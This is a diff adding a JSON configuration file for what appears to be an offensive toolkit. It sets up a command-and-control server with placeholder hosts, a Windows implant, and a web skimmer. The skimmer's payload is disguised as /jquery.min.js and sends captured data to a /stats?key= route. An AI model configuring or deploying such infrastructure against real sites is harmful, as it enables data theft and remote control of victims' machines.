@@ -1,0 +1,35 @@
+{
+    "c2": {
+        "domain": "c2.domain.tld",
+        "dns_ip": "127.0.0.1",
+        "dns_port": 53,
+        "web_ip": "127.0.0.1",
+        "web_port": 4321,
+        "binary_route": "/setup.exe",
+        "web_url": "http://c2.domain.tld"
+    },
+    "skimmer": {
+        "payload_route": "/jquery.min.js",
+        "data_route": "/stats",
+        "url": "http://c2.domain.tld/stats?key=",
+        "target_classes": [],
+        "target_ids": []
+    },    
+    "proxy": {
+        "enabled": false,
+        "key": "[PROXY_KEY]",
+        "interval": 2000,
+        "url": "http://proxy.domain.tld/proxy.php"
+    },
+    "static_dns": {
+        "c2.domain.tld": "127.0.0.1"
+    },
+    "implant": {
+        "os": "windows",
+        "arch": "amd64",
+        "debug": false,
+        "interval": 5000,
+        "resolver": "8.8.8.8:53"
+    },
+    "debug": false
+}
